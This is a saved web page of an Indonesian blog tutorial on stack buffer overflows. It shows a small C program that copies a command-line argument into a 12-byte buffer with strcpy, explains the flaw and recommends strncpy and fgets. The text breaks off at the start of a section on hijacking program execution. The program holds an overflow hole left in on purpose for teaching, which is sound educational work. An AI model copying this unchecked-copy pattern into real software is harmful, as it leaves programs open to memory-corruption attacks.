<!DOCTYPE html>
<html class="wf-ubuntu-n4-active wf-ubuntu-i4-active wf-ubuntu-n7-active wf-ubuntu-i7-active wf-active" lang="en"><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="profile" href="http://gmpg.org/xfn/11">

<title>Stack Buffer Overflow : Part II – Reversing and Pwning</title>
<script src="Stack%20Buffer%20Overflow%20%20%20Part%20II%20%E2%80%93%20Reversing%20and%20Pwning_files/webfont.js" type="text/javascript" async=""></script><script type="text/javascript">
  WebFontConfig = {"google":{"families":["Ubuntu:r,i,b,bi:latin,latin-ext"]}};
  (function() {
    var wf = document.createElement('script');
    wf.src = 'https://s0.wp.com/wp-content/plugins/custom-fonts/js/webfont.js';
    wf.type = 'text/javascript';
    wf.async = 'true';
    var s = document.getElementsByTagName('script')[0];
    s.parentNode.insertBefore(wf, s);
	})();
</script><style id="jetpack-custom-fonts-css">.wf-active code, .wf-active kbd, .wf-active pre, .wf-active samp{font-family:"Ubuntu",sans-serif}.wf-active body{font-family:"Ubuntu",sans-serif}.wf-active button, .wf-active input, .wf-active select{font-family:"Ubuntu",sans-serif}.wf-active textarea{font-family:"Ubuntu",sans-serif}.wf-active blockquote{font-family:"Ubuntu",sans-serif}.wf-active code, .wf-active kbd, .wf-active pre, .wf-active tt, .wf-active var{font-family:"Ubuntu",sans-serif}.wf-active .button, .wf-active .more-link, .wf-active button:not(.menu-toggle), .wf-active input[type="button"], .wf-active input[type="reset"], .wf-active input[type="submit"], .wf-active .posts-navigation .nav-links a, .wf-active #content #infinite-handle span button{font-family:"Ubuntu",sans-serif}.wf-active input[type="email"], .wf-active input[type="password"], .wf-active input[type="search"], .wf-active input[type="text"], .wf-active input[type="url"], .wf-active textarea{font-family:"Ubuntu",sans-serif}.wf-active .post-navigation{font-family:"Ubuntu",sans-serif}.wf-active .main-navigation{font-family:"Ubuntu",sans-serif}.wf-active .entry-content, .wf-active .entry-summary, .wf-active .page-content{font-family:"Ubuntu",sans-serif}.wf-active .entry-content .subtitle{font-family:"Ubuntu",sans-serif}.wf-active #comments{font-family:"Ubuntu",sans-serif}.wf-active .comment-form label{font-family:"Ubuntu",sans-serif}.wf-active .comment-form span.required{font-family:"Ubuntu",sans-serif}.wf-active .widget_recent_entries span.post-date{font-family:"Ubuntu",sans-serif}.wf-active .site-description{font-family:"Ubuntu",sans-serif}.wf-active .site-posted-on time{font-family:"Ubuntu",sans-serif}.wf-active .page-header:not(.page-header-light) .taxonomy-description{font-family:"Ubuntu",sans-serif}.wf-active .light-text{font-family:"Ubuntu",sans-serif}.wf-active .site-info{font-family:"Ubuntu",sans-serif}.wf-active .sticky-label{font-family:"Ubuntu",sans-serif}.wf-active .post-details, .wf-active .post-details a{font-family:"Ubuntu",sans-serif}.wf-active .page-links{font-family:"Ubuntu",sans-serif}.wf-active .post-edit-link{font-family:"Ubuntu",sans-serif}.wf-active .post-author-card .author-description{font-family:"Ubuntu",sans-serif}</style>
<meta name="google-site-verification" content="RevT-82WutbKn2lZl7kNv6I92iySLcHLCVeDrlAwQ60">
<link rel="dns-prefetch" href="https://s0.wp.com/">
<link rel="dns-prefetch" href="https://wordpress.com/">
<link rel="dns-prefetch" href="https://s.pubmine.com/">
<link rel="dns-prefetch" href="https://x.bidswitch.net/">
<link rel="dns-prefetch" href="https://static.criteo.net/">
<link rel="dns-prefetch" href="https://ib.adnxs.com/">
<link rel="dns-prefetch" href="https://aax.amazon-adsystem.com/">
<link rel="dns-prefetch" href="https://bidder.criteo.com/">
<link rel="dns-prefetch" href="https://cas.criteo.com/">
<link rel="dns-prefetch" href="https://gum.criteo.com/">
<link rel="dns-prefetch" href="https://ads.pubmatic.com/">
<link rel="dns-prefetch" href="https://gads.pubmatic.com/">
<link rel="dns-prefetch" href="https://tpc.googlesyndication.com/">
<link rel="dns-prefetch" href="https://ad.doubleclick.net/">
<link rel="dns-prefetch" href="https://googleads.g.doubleclick.net/">
<link rel="dns-prefetch" href="https://www.googletagservices.com/">
<link rel="dns-prefetch" href="https://cdn.switchadhub.com/">
<link rel="dns-prefetch" href="https://delivery.g.switchadhub.com/">
<link rel="dns-prefetch" href="https://delivery.swid.switchadhub.com/">
<link rel="dns-prefetch" href="https://a.teads.tv/">
<link rel="dns-prefetch" href="https://prebid.media.net/">
<link rel="dns-prefetch" href="https://adserver-us.adtech.advertising.com/">
<link rel="dns-prefetch" href="https://fastlane.rubiconproject.com/">
<link rel="dns-prefetch" href="https://prebid-server.rubiconproject.com/">
<link rel="dns-prefetch" href="https://hb-api.omnitagjs.com/">
<link rel="dns-prefetch" href="https://mtrx.go.sonobi.com/">
<link rel="dns-prefetch" href="https://apex.go.sonobi.com/">
<link rel="dns-prefetch" href="https://u.openx.net/">
<link rel="alternate" type="application/rss+xml" title="Reversing and Pwning » Feed" href="https://reversingpwn.wordpress.com/feed/">
<link rel="alternate" type="application/rss+xml" title="Reversing and Pwning » Comments Feed" href="https://reversingpwn.wordpress.com/comments/feed/">
<link rel="alternate" type="application/rss+xml" title="Reversing and Pwning » Stack Buffer Overflow : Part&nbsp;II Comments Feed" href="https://reversingpwn.wordpress.com/2017/07/08/stack-buffer-overflow-part-ii/feed/">
	<script type="text/javascript">
		/* <![CDATA[ */
		function addLoadEvent(func) {
			var oldonload = window.onload;
			if (typeof window.onload != 'function') {
				window.onload = func;
			} else {
				window.onload = function () {
					oldonload();
					func();
				}
			}
		}
		/* ]]> */
	</script>
			<script type="text/javascript">
			window._wpemojiSettings = {"baseUrl":"https:\/\/s0.wp.com\/wp-content\/mu-plugins\/wpcom-smileys\/twemoji\/2\/72x72\/","ext":".png","svgUrl":"https:\/\/s0.wp.com\/wp-content\/mu-plugins\/wpcom-smileys\/twemoji\/2\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/s0.wp.com\/wp-includes\/js\/wp-emoji-release.min.js?m=1582709031h&ver=5.4.2"}};
			/*! This file is auto-generated */
			!function(e,a,t){var r,n,o,i,p=a.createElement("canvas"),s=p.getContext&&p.getContext("2d");function c(e,t){var a=String.fromCharCode;s.clearRect(0,0,p.width,p.height),s.fillText(a.apply(this,e),0,0);var r=p.toDataURL();return s.clearRect(0,0,p.width,p.height),s.fillText(a.apply(this,t),0,0),r===p.toDataURL()}function l(e){if(!s||!s.fillText)return!1;switch(s.textBaseline="top",s.font="600 32px Arial",e){case"flag":return!c([127987,65039,8205,9895,65039],[127987,65039,8203,9895,65039])&&(!c([55356,56826,55356,56819],[55356,56826,8203,55356,56819])&&!c([55356,57332,56128,56423,56128,56418,56128,56421,56128,56430,56128,56423,56128,56447],[55356,57332,8203,56128,56423,8203,56128,56418,8203,56128,56421,8203,56128,56430,8203,56128,56423,8203,56128,56447]));case"emoji":return!c([55357,56424,55356,57342,8205,55358,56605,8205,55357,56424,55356,57340],[55357,56424,55356,57342,8203,55358,56605,8203,55357,56424,55356,57340])}return!1}function d(e){var t=a.createElement("script");t.src=e,t.defer=t.type="text/javascript",a.getElementsByTagName("head")[0].appendChild(t)}for(i=Array("flag","emoji"),t.supports={everything:!0,everythingExceptFlag:!0},o=0;o<i.length;o++)t.supports[i[o]]=l(i[o]),t.supports.everything=t.supports.everything&&t.supports[i[o]],"flag"!==i[o]&&(t.supports.everythingExceptFlag=t.supports.everythingExceptFlag&&t.supports[i[o]]);t.supports.everythingExceptFlag=t.supports.everythingExceptFlag&&!t.supports.flag,t.DOMReady=!1,t.readyCallback=function(){t.DOMReady=!0},t.supports.everything||(n=function(){t.readyCallback()},a.addEventListener?(a.addEventListener("DOMContentLoaded",n,!1),e.addEventListener("load",n,!1)):(e.attachEvent("onload",n),a.attachEvent("onreadystatechange",function(){"complete"===a.readyState&&t.readyCallback()})),(r=t.source||{}).concatemoji?d(r.concatemoji):r.wpemoji&&r.twemoji&&(d(r.twemoji),d(r.wpemoji)))}(window,document,window._wpemojiSettings);
		</script><script src="Stack%20Buffer%20Overflow%20%20%20Part%20II%20%E2%80%93%20Reversing%20and%20Pwning_files/wp-emoji-release.js" type="text/javascript" defer="defer"></script>
		<style type="text/css">
img.wp-smiley,
img.emoji {
	display: inline !important;
	border: none !important;
	box-shadow: none !important;
	height: 1em !important;
	width: 1em !important;
	margin: 0 .07em !important;
	vertical-align: -0.1em !important;
	background: none !important;
	padding: 0 !important;
}
</style>
	<link rel="stylesheet" id="all-css-0-1" href="Stack%20Buffer%20Overflow%20%20%20Part%20II%20%E2%80%93%20Reversing%20and%20Pwning_files/a_002.css" type="text/css" media="all">
<style id="wp-block-library-inline-css">
.has-text-align-justify {
	text-align:justify;
}
</style>
<style id="global-styles-inline-css">
:root {
	--wp--preset--color--medium-blue: #0087be;
	--wp--preset--color--bright-blue: #00aadc;
	--wp--preset--color--dark-gray: #4d4d4b;
	--wp--preset--color--light-gray: #b3b3b1;
	--wp--preset--color--white: #fff;
	--wp--preset--font-size--small: 13;
	--wp--preset--font-size--normal: 16;
	--wp--preset--font-size--medium: 20;
	--wp--preset--font-size--large: 36;
	--wp--preset--font-size--huge: 48;
	--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);
	--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);
	--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);
	--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);
	--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);
	--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);
	--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgba(252,185,0,1) 0%,rgba(255,105,0,1) 100%);
	--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgba(255,105,0,1) 0%,rgb(207,46,46) 100%);
	--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);
	--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);
	--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);
	--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgba(6,147,227,1) 0%,rgb(155,81,224) 100%);
}

</style>
<link rel="stylesheet" id="all-css-2-1" href="Stack%20Buffer%20Overflow%20%20%20Part%20II%20%E2%80%93%20Reversing%20and%20Pwning_files/a_003.css" type="text/css" media="all">
<style id="independent-publisher-2-style-inline-css">
#hero-header { background: url("https://reversingpwn.files.wordpress.com/2019/10/cropped-visual_panel_mode_debugging.png") no-repeat center; background-size: cover; background-attachment: scroll; }
</style>
<link rel="stylesheet" id="print-css-3-1" href="Stack%20Buffer%20Overflow%20%20%20Part%20II%20%E2%80%93%20Reversing%20and%20Pwning_files/global-print.css" type="text/css" media="print">
<link rel="stylesheet" id="all-css-4-1" href="Stack%20Buffer%20Overflow%20%20%20Part%20II%20%E2%80%93%20Reversing%20and%20Pwning_files/actionbar.css" type="text/css" media="all">
<style id="jetpack-global-styles-frontend-style-inline-css">
:root { --font-headings: unset; --font-base: unset; --font-headings-default: -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Oxygen-Sans,Ubuntu,Cantarell,"Helvetica Neue",sans-serif; --font-base-default: -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Oxygen-Sans,Ubuntu,Cantarell,"Helvetica Neue",sans-serif;}
</style>
<link rel="stylesheet" id="all-css-6-1" href="Stack%20Buffer%20Overflow%20%20%20Part%20II%20%E2%80%93%20Reversing%20and%20Pwning_files/a.css" type="text/css" media="all">
<link rel="stylesheet" href="Stack%20Buffer%20Overflow%20%20%20Part%20II%20%E2%80%93%20Reversing%20and%20Pwning_files/css.css" media="all"><script>
var related_posts_js_options = {"post_heading":"h4"};
</script>
<script type="text/javascript" src="Stack%20Buffer%20Overflow%20%20%20Part%20II%20%E2%80%93%20Reversing%20and%20Pwning_files/a_003.js"></script>
<link rel="stylesheet" id="all-css-0-2" href="Stack%20Buffer%20Overflow%20%20%20Part%20II%20%E2%80%93%20Reversing%20and%20Pwning_files/style.css" type="text/css" media="all">
<!--[if lt IE 8]>
<link rel='stylesheet' id='highlander-comments-ie7-css'  href='https://s0.wp.com/wp-content/mu-plugins/highlander-comments/style-ie7.css?m=1351637563h&#038;ver=20110606' media='all' />
<![endif]-->
<link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://reversingpwn.wordpress.com/xmlrpc.php?rsd">
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="https://s0.wp.com/wp-includes/wlwmanifest.xml"> 
<link rel="prev" title="Stack Buffer Overflow : Part&nbsp;I" href="https://reversingpwn.wordpress.com/2017/07/08/stack-buffer-overflow-part-i/">
<link rel="next" title="Return Oriented Programming&nbsp;Tutorial" href="https://reversingpwn.wordpress.com/2017/07/29/93/">
<meta name="generator" content="WordPress.com">
<link rel="canonical" href="https://reversingpwn.wordpress.com/2017/07/08/stack-buffer-overflow-part-ii/">
<link rel="shortlink" href="https://wp.me/p8T98y-1h">
<link rel="alternate" type="application/json+oembed" href="https://public-api.wordpress.com/oembed/?format=json&amp;url=https%3A%2F%2Freversingpwn.wordpress.com%2F2017%2F07%2F08%2Fstack-buffer-overflow-part-ii%2F&amp;for=wpcom-auto-discovery"><link rel="alternate" type="application/xml+oembed" href="https://public-api.wordpress.com/oembed/?format=xml&amp;url=https%3A%2F%2Freversingpwn.wordpress.com%2F2017%2F07%2F08%2Fstack-buffer-overflow-part-ii%2F&amp;for=wpcom-auto-discovery">
<!-- Jetpack Open Graph Tags -->
<meta property="og:type" content="article">
<meta property="og:title" content="Stack Buffer Overflow : Part II">
<meta property="og:url" content="https://reversingpwn.wordpress.com/2017/07/08/stack-buffer-overflow-part-ii/">
<meta property="og:description" content="Assalamualaikum Wr. Wb. Kali ini saya ingin melanjutkan pembahasan pada artikel sebelumnya. Artikel sebelumnya saya sudah menjelaskan tentang stack, dan bagaimana mengoverwrite data2 pada stack, ka…">
<meta property="article:published_time" content="2017-07-08T15:38:19+00:00">
<meta property="article:modified_time" content="2017-07-12T08:10:44+00:00">
<meta property="og:site_name" content="Reversing and Pwning">
<meta property="og:image" content="https://s0.wp.com/i/blank.jpg">
<meta property="og:locale" content="en_US">
<meta name="twitter:site" content="@wordpressdotcom">
<meta name="twitter:text:title" content="Stack Buffer Overflow : Part&nbsp;II">
<meta name="twitter:card" content="summary">
<meta property="fb:app_id" content="249643311490">
<meta property="article:publisher" content="https://www.facebook.com/WordPresscom">

<!-- End Jetpack Open Graph Tags -->
<link rel="shortcut icon" type="image/x-icon" href="https://s0.wp.com/i/favicon.ico" sizes="16x16 24x24 32x32 48x48">
<link rel="icon" type="image/x-icon" href="https://s0.wp.com/i/favicon.ico" sizes="16x16 24x24 32x32 48x48">
<link rel="apple-touch-icon" href="https://s0.wp.com/i/webclip.png">
<link rel="search" type="application/opensearchdescription+xml" href="https://reversingpwn.wordpress.com/osd.xml" title="Reversing and Pwning">
<link rel="search" type="application/opensearchdescription+xml" href="https://s1.wp.com/opensearch.xml" title="WordPress.com">
<link rel="pingback" href="https://reversingpwn.wordpress.com/xmlrpc.php"><meta name="application-name" content="Reversing and Pwning"><meta name="msapplication-window" content="width=device-width;height=device-height"><meta name="msapplication-tooltip" content="analyzing code for fun not profit"><meta name="msapplication-task" content="name=Subscribe;action-uri=https://reversingpwn.wordpress.com/feed/;icon-uri=https://s0.wp.com/i/favicon.ico"><meta name="msapplication-task" content="name=Sign up for a free blog;action-uri=http://wordpress.com/signup/;icon-uri=https://s0.wp.com/i/favicon.ico"><meta name="msapplication-task" content="name=WordPress.com Support;action-uri=http://support.wordpress.com/;icon-uri=https://s0.wp.com/i/favicon.ico"><meta name="msapplication-task" content="name=WordPress.com Forums;action-uri=http://forums.wordpress.com/;icon-uri=https://s0.wp.com/i/favicon.ico"><meta name="description" content="Assalamualaikum Wr. Wb. Kali ini saya ingin melanjutkan pembahasan pada artikel sebelumnya. Artikel sebelumnya saya sudah menjelaskan tentang stack, dan bagaimana mengoverwrite data2 pada stack, karena kesalahan sang programmer yg tidak memfilter panjang input. Fungsi strcpy tidak mengecek panjang input, seberapa pun panjang dari argv[1] akan dicopy ke variable str sebagai destination buffer. Agar lebih…">
		<script type="text/javascript">

			window.doNotSellCallback = function() {

				var linkElements = [
					'a[href="https://wordpress.com/?ref=footer_blog"]',
					'a[href="https://wordpress.com/?ref=footer_website"]',
					'a[href="https://wordpress.com/?ref=vertical_footer"]',
					'a[href^="https://wordpress.com/?ref=footer_segment_"]',
				].join(',');

				var dnsLink = document.createElement( 'a' );
				dnsLink.href = 'https://wordpress.com/advertising-program-optout';
				dnsLink.classList.add( 'do-not-sell-link' );
				dnsLink.rel = 'nofollow';
				dnsLink.style.marginLeft = '0.5em';
				dnsLink.textContent = 'Do Not Sell My Personal Information';

				var creditLinks = document.querySelectorAll( linkElements );

				if ( 0 === creditLinks.length ) {
					return false;
				}

				Array.prototype.forEach.call( creditLinks, function( el ) {
					el.insertAdjacentElement( 'afterend', dnsLink );
				});

				return true;
			};

		</script>
				<script type="text/javascript">
		function __ATA_CC() {var v = document.cookie.match('(^|;) ?personalized-ads-consent=([^;]*)(;|$)');return v ? 1 : 0;}
		var __ATA_PP = { pt: 1, ht: 0, tn: 'independent-publisher-2', amp: false, siteid: 8982, blogid: 131353854, consent: __ATA_CC() };
		var __ATA = __ATA || {};
		__ATA.cmd = __ATA.cmd || [];
		__ATA.criteo = __ATA.criteo || {};
		__ATA.criteo.cmd = __ATA.criteo.cmd || [];
		</script>
		<script type="text/javascript">
		(function(){var g=Date.now||function(){return+new Date};function h(a,b){a:{for(var c=a.length,d="string"==typeof a?a.split(""):a,e=0;e<c;e++)if(e in d&&b.call(void 0,d[e],e,a)){b=e;break a}b=-1}return 0>b?null:"string"==typeof a?a.charAt(b):a[b]};function k(a,b,c){c=null!=c?"="+encodeURIComponent(String(c)):"";if(b+=c){c=a.indexOf("#");0>c&&(c=a.length);var d=a.indexOf("?");if(0>d||d>c){d=c;var e=""}else e=a.substring(d+1,c);a=[a.substr(0,d),e,a.substr(c)];c=a[1];a[1]=b?c?c+"&"+b:b:c;a=a[0]+(a[1]?"?"+a[1]:"")+a[2]}return a};var l=0;function m(a,b){var c=document.createElement("script");c.src=a;c.onload=function(){b&&b(void 0)};c.onerror=function(){b("error")};a=document.getElementsByTagName("head");var d;a&&0!==a.length?d=a[0]:d=document.documentElement;d.appendChild(c)}function n(a){var b=void 0===b?document.cookie:b;return(b=h(b.split("; "),function(c){return-1!=c.indexOf(a+"=")}))?b.split("=")[1]:""}function p(a){return"string"==typeof a&&0<a.length}
		function r(a,b,c){b=void 0===b?"":b;c=void 0===c?".":c;var d=[];Object.keys(a).forEach(function(e){var f=a[e],q=typeof f;"object"==q&&null!=f||"function"==q?d.push(r(f,b+e+c)):null!==f&&void 0!==f&&(e=encodeURIComponent(b+e),d.push(e+"="+encodeURIComponent(f)))});return d.filter(p).join("&")}function t(a,b){a||((window.__ATA||{}).config=b.c,m(b.url))}var u=Math.floor(1E13*Math.random()),v=window.__ATA||{};window.__ATA=v;v.rid=u;v.createdAt=g();var w=window.__ATA||{},x="s.pubmine.com";
		w&&w.serverDomain&&(x=w.serverDomain);var y="//"+x+"/conf",z=window.top===window,A=window.__ATA_PP&&window.__ATA_PP.gdpr_applies,B="boolean"===typeof A?Number(A):null,C=window.__ATA_PP||null,D=z?document.referrer?document.referrer:null:null,E=z?window.location.href:document.referrer?document.referrer:null,F,G=n("__ATA_tuuid");F=G?G:null;var H=window.innerWidth+"x"+window.innerHeight,I=n("usprivacy"),J=r({gdpr:B,pp:C,rid:u,src:D,ref:E,tuuid:F,vp:H,us_privacy:I?I:null},"",".");
		(function(a){var b=void 0===b?"cb":b;l++;var c="callback__"+g().toString(36)+"_"+l.toString(36);a=k(a,b,c);window[c]=function(d){t(void 0,d)};m(a,function(d){d&&t(d)})})(y+"?"+J);}).call(this);
		</script><script src="Stack%20Buffer%20Overflow%20%20%20Part%20II%20%E2%80%93%20Reversing%20and%20Pwning_files/conf"></script><link rel="amphtml" href="https://reversingpwn.wordpress.com/2017/07/08/stack-buffer-overflow-part-ii/amp/"><script type="text/javascript">
	window.google_analytics_uacct = "UA-52447-2";
</script>

<script type="text/javascript">
	var _gaq = _gaq || [];
	_gaq.push(['_setAccount', 'UA-52447-2']);
	_gaq.push(['_gat._anonymizeIp']);
	_gaq.push(['_setDomainName', 'wordpress.com']);
	_gaq.push(['_initData']);
	_gaq.push(['_trackPageview']);

	(function() {
		var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
		ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
		(document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(ga);
	})();
</script><script type="text/javascript" async="" src="Stack%20Buffer%20Overflow%20%20%20Part%20II%20%E2%80%93%20Reversing%20and%20Pwning_files/ga.js"></script>
<script src="Stack%20Buffer%20Overflow%20%20%20Part%20II%20%E2%80%93%20Reversing%20and%20Pwning_files/ata.js"></script><script charset="utf-8" src="Stack%20Buffer%20Overflow%20%20%20Part%20II%20%E2%80%93%20Reversing%20and%20Pwning_files/2.js"></script><link rel="stylesheet" type="text/css" href="Stack%20Buffer%20Overflow%20%20%20Part%20II%20%E2%80%93%20Reversing%20and%20Pwning_files/shCore.css"><link rel="stylesheet" type="text/css" href="Stack%20Buffer%20Overflow%20%20%20Part%20II%20%E2%80%93%20Reversing%20and%20Pwning_files/shThemeDefault.css"><link rel="stylesheet" type="text/css" id="gravatar-card-css" href="Stack%20Buffer%20Overflow%20%20%20Part%20II%20%E2%80%93%20Reversing%20and%20Pwning_files/hovercard.css"><link rel="stylesheet" type="text/css" id="gravatar-card-services-css" href="Stack%20Buffer%20Overflow%20%20%20Part%20II%20%E2%80%93%20Reversing%20and%20Pwning_files/services.css"></head>

<body class="post-template-default single single-post postid-79 single-format-standard wp-embed-responsive customizer-styles-applied has-header-image highlander-enabled highlander-light tablet-desktop">

<div id="page" class="hfeed site">
	<a class="skip-link screen-reader-text" href="#content">Skip to content</a>

	<div id="hero-header" class="site-hero-section">
		<header id="masthead" class="site-header" role="banner">
			<div class="inner">
				<div class="site-branding">
					
											<a class="site-logo-link" href="https://reversingpwn.wordpress.com/">
							<img alt="" class="site-logo-image no-grav grav-hashed" src="Stack%20Buffer%20Overflow%20%20%20Part%20II%20%E2%80%93%20Reversing%20and%20Pwning_files/d7ea009529d9c8db6cf12c108b7b486a.jpeg" id="grav-d7ea009529d9c8db6cf12c108b7b486a-0" width="80" height="80">
						</a><!-- .site-logo-link -->
													<p class="site-title"><a href="https://reversingpwn.wordpress.com/" rel="home">Reversing and Pwning</a></p>
													<p class="site-description">analyzing code for fun not profit</p>
									</div><!-- .site-branding -->

				
									<button class="menu-toggle" aria-controls="primary-menu" aria-expanded="false" id="primary-menu-button">
						Menu					</button><!-- .menu-toggle -->
				
			</div><!-- .inner -->
		</header><!-- #masthead -->
	</div>

				<nav id="site-navigation" class="main-navigation" role="navigation">
			<div class="menu-home-container"><ul id="primary-menu" class="menu nav-menu" aria-expanded="false"><li id="menu-item-71" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-71"><a href="https://reversingpwn.wordpress.com/">Home</a></li>
<li id="menu-item-73" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-73"><a href="https://reversingpwn.wordpress.com/2017/07/01/first-blog-post/">About</a></li>
<li id="menu-item-72" class="menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor current-menu-parent current-post-parent menu-item-72"><a href="https://reversingpwn.wordpress.com/category/pwn/">pwn</a></li>
</ul></div>		</nav><!-- .main-navigation -->
	
	
	
	<div id="content-wrapper" class="content-wrapper">
		<div id="content" class="site-content">

	<div id="primary" class="content-area">
		<main id="main" class="site-main" role="main">

		
			
<article id="post-79" class="post-79 post type-post status-publish format-standard hentry category-pwn">
			<header class="entry-header">
			<h1 class="entry-title">Stack Buffer Overflow : Part&nbsp;II</h1>		</header><!-- .entry-header -->		<div class="entry-meta">
			<span class="byline">
				<a href="https://reversingpwn.wordpress.com/author/n0psledbyte/" title="Posts by n0psledbyte" rel="author">n0psledbyte</a>			</span>
							<span class="cat-links">
					<a href="https://reversingpwn.wordpress.com/category/pwn/" rel="category tag">pwn</a>				</span><!-- .cat-links -->
			
			
			<span class="published-on">
				<time class="entry-date published" datetime="2017-07-08T15:38:19+07:00">July 8, 2017</time><time class="updated" datetime="2017-07-12T08:10:44+07:00">July 12, 2017</time>			</span>

			<span class="word-count">17 Minutes</span>		</div><!-- .entry-meta -->
	
	<div class="entry-content">
		<p data-adtags-visited="true">Assalamualaikum Wr. Wb. Kali ini saya 
ingin melanjutkan pembahasan pada artikel sebelumnya. Artikel sebelumnya
 saya sudah menjelaskan tentang stack, dan bagaimana mengoverwrite data2
 pada stack, karena kesalahan sang programmer yg tidak memfilter panjang
 input.</p>
<div><div id="highlighter_423559" class="syntaxhighlighter  cpp"><table cellspacing="0" cellpadding="0" border="0"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div><div class="line number3 index2 alt2">3</div><div class="line number4 index3 alt1">4</div><div class="line number5 index4 alt2">5</div><div class="line number6 index5 alt1">6</div><div class="line number7 index6 alt2">7</div><div class="line number8 index7 alt1">8</div><div class="line number9 index8 alt2">9</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="cpp preprocessor">#include &lt;stdio.h&gt;</code></div><div class="line number2 index1 alt1"><code class="cpp preprocessor">#include &lt;string.h&gt;</code></div><div class="line number3 index2 alt2"><code class="cpp color1 bold">int</code> <code class="cpp plain">main(</code><code class="cpp color1 bold">int</code> <code class="cpp plain">argc, </code><code class="cpp color1 bold">char</code><code class="cpp plain">** argv){</code></div><div class="line number4 index3 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp color1 bold">int</code> <code class="cpp plain">j = 0xcafebabe;</code></div><div class="line number5 index4 alt2"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp color1 bold">char</code> <code class="cpp plain">str[12];</code></div><div class="line number6 index5 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp keyword bold">if</code><code class="cpp plain">( argc &gt; 1)</code></div><div class="line number7 index6 alt2"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp functions bold">strcpy</code><code class="cpp plain">(str,argv[1]);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; # </code><code class="cpp functions bold">strcpy</code> <code class="cpp plain">doesn't check length of str</code></div><div class="line number8 index7 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp functions bold">printf</code><code class="cpp plain">(</code><code class="cpp string">"nilai j adalah 0x%x\n"</code><code class="cpp plain">,j);</code></div><div class="line number9 index8 alt2"><code class="cpp plain">}</code></div></div></td></tr></tbody></table></div></div>
<p data-adtags-visited="true">Fungsi strcpy tidak mengecek panjang 
input, seberapa pun panjang dari argv[1] akan dicopy ke variable str 
sebagai destination buffer. Agar lebih aman gunakan fungsi strcnpy, 
fungsi strncpy akan mengkopi source ke destination dengan panjang yg 
sudah ditentukan di paramter ketiga.</p>
<blockquote><p>
  char *strncpy(char *dest, const char *src, size_t n);
</p></blockquote>
<p class="inline-ad-slot" id="inline-ad-0" style="float:left;height:0px;margin:0 auto;overflow:hidden;width:740px;" data-adtags-width="740" data-adtags-visited="true"></p><p data-adtags-visited="true">Ganti baris ke 7 dengan <code>strncpy(str,argv[1],sizeof(str))</code> dimana sizeof(str) adalah ukuran dari variable str (12byte), nantinya akan dikopi string argv[1] ke str sebanyak 12byte<br>
Sama dengan fungsi strcpy fungsi gets juga tidak aman, karena tidak 
memfilter panjang input, sebagai gantinya gunakan fungsi fgets</p>
<blockquote><p>
  char *fgets(char *s, int size, FILE *stream);
</p></blockquote>
<h2>Buffer Overflow to Change Program Execution</h2>
<p data-adtags-visited="true">Ok, saya mempunyai program berikut ini.</p>
<div><div id="highlighter_241587" class="syntaxhighlighter  plain"><table cellspacing="0" cellpadding="0" border="0"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div><div class="line number3 index2 alt2">3</div><div class="line number4 index3 alt1">4</div><div class="line number5 index4 alt2">5</div><div class="line number6 index5 alt1">6</div><div class="line number7 index6 alt2">7</div><div class="line number8 index7 alt1">8</div><div class="line number9 index8 alt2">9</div><div class="line number10 index9 alt1">10</div><div class="line number11 index10 alt2">11</div><div class="line number12 index11 alt1">12</div><div class="line number13 index12 alt2">13</div><div class="line number14 index13 alt1">14</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="plain plain">#include &lt;stdio.h&gt;</code></div><div class="line number2 index1 alt1"><code class="plain 